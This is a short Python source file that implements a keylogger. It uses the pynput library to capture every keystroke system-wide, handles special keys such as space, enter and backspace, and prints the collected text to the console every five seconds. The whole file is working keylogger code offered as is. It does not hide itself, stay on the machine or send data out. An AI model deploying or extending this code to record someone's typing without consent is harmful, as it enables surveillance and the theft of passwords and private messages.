import pynput.keyboard as pn
import threading

sort_keys = ""

class Keylogger:
    def __init__(self):
        self.sort_keys = ""
        self.timer = None

    def key_press(self, key):
        try:
            self.sort_keys += key.char
        except AttributeError:
            if key == pn.Key.space:
                self.sort_keys += " "
            elif key == pn.Key.enter:
                self.sort_keys += '\n'
            elif key == pn.Key.backspace:
                self.sort_keys = self.sort_keys[:-1]
            else:
                self.sort_keys += ' ' + str(key) + ' '

    def report(self):
        print(self.sort_keys)
        self.sort_keys = ""
        self.timer = threading.Timer(5, self.report)
        self.timer.start()

    def start(self):
        with pn.Listener(on_press=self.key_press) as listener:
            self.report()
            listener.join()

    def stop(self):
        if self.timer:
            self.timer.cancel()

if __name__ == "__main__":
    mykeylogger = Keylogger()
    try:
        mykeylogger.start()
    except KeyboardInterrupt:
        mykeylogger.stop()
        print("\nKeylogger stopped.")
